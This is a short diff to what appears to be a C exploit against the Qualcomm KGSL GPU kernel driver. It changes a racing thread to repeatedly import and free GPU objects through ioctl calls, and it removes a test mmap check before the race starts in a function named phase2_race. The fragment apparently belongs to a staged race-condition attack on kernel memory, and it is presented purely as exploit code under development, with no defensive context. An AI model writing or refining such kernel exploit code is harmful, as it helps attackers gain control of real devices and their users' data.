@@ -196,24 +196,17 @@ static void *race_thread(void *arg) {
         .flags = KGSL_MEMFLAGS_USE_CPU_MAP, .type = KGSL_USER_MEM_TYPE_ADDR,
     };
     while (!race_done) {
-        ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_IMPORT, &imp);
-        sched_yield();
+        if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_IMPORT, &imp) == 0) {
+            struct kgsl_gpuobj_free f = { .id = imp.id };
+            ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &f);
+        }
+        usleep(1);
     }
     return NULL;
 }
 
 static bool phase2_race(void) {
     int ov_id = gpuobj_alloc(OVERLAP_SIZE, alloc_flags);
-
-    // Test if the object can be mapped at all (non-fixed)
-    void *test = mmap(NULL, OVERLAP_SIZE, PROT_READ|PROT_WRITE,
-                      MAP_SHARED, kgsl_fd, (off_t)ov_id << 12);
-    if (test == MAP_FAILED) {
-        perror("test mmap failed");
-        return false;
-    }
-    munmap(test, OVERLAP_SIZE);
-
     pthread_t thr;
     if (pthread_create(&thr, NULL, race_thread, NULL) != 0) die("pthread");
 
